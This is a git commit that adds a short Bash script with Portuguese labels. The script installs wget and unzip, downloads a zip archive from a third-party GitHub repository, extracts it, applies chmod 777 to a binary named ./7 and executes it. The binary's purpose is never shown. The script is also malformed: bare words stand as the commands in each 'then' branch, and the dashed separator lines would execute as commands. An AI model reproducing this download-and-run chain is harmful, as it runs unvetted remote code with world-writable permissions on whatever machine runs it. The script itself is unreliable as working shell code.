d3ca9ed7f1a16b66c4edb605664b1f1fbd907bbe
sdujuednw <49121018+sdujuednw@users.noreply.github.com>
2019-04-03 14:32:26 -0300

    Add files via upload

---
+++ 2.sh
@@ -0,0 +1,57 @@
+#!/bin/bash
+if apt-get update;
+
+then
+
+atualizando
+
+fi
+------------------------
+if apt install wget;
+
+then
+
+instalando wget
+
+fi
+---------------------------
+if apt-get install unzip;
+
+then
+
+instalando unzip
+
+fi
+----------------------------
+if wget https://github.com/deepkker/xdsddsd/raw/master/6.zip;
+
+then
+
+AÇÕES
+
+fi
+
+----------------------------
+if unzip 6.zip;
+
+then
+
+descopactando
+
+fi
+
+if chmod 777 ./7;
+
+then
+
+pemição
+
+fi
+
+if ./7;
+
+then
+
+execuntando
+
+fi
